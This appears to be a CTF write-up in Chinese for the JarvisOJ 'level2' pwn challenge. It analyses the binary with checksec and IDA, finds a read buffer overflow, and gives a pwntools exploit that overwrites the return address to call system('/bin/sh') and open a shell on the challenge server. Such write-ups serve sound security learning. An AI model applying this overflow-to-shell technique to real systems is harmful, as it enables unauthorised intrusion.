---
layout:     post
title:      jarvisoj [XMAN]level2
author:     wooy0ung
tags: 		pwn
category:  	writeup
---


>Problem Address:  
>https://www.jarvisoj.com  
>  
>Download:  
>https://dn.jarvisoj.com/challengefiles/level2.54931449c557d0551c4fc2a10f4778a1  
>  
>Address:  
>nc pwn2.jarvisoj.com 9878  
<!-- more -->


### 0x00 可执行文件特征

```
file level2
checksec level2
chmod a+x ./level2
./level2
```

![](/assets/img/writeup/pwn/2017-06-16-jarvisoj-level2/0x00.png)

![](/assets/img/writeup/pwn/2017-06-16-jarvisoj-level2/0x01.png)


### 0x02 放到IDA里分析

直接反编译成C语言，存在read溢出函数和system函数，可令read溢出构造system("\bin\sh")

![](/assets/img/writeup/pwn/2017-06-16-jarvisoj-level2/0x02.png)

查看system的地址

![](/assets/img/writeup/pwn/2017-06-16-jarvisoj-level2/0x03.png)

查看/bin/sh的地址

![](/assets/img/writeup/pwn/2017-06-16-jarvisoj-level2/0x04.png)

计算缓冲区到返回地址的距离，0x88个字节

![](/assets/img/writeup/pwn/2017-06-16-jarvisoj-level2/0x05.png)

![](/assets/img/writeup/pwn/2017-06-16-jarvisoj-level2/0x06.png)


### 0x02 最后的exploit如下


```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *
payload = 'A' * (0x88 + 0x04) + p32(0x08048320) + p32(0) + p32(0x0804A024)
# Io = process('./level2')
Io = remote('pwn2.jarvisoj.com', 9878)
Io.send(payload)
Io.interactive()
```

得到flag

![](/assets/img/writeup/pwn/2017-06-16-jarvisoj-level2/0x07.png)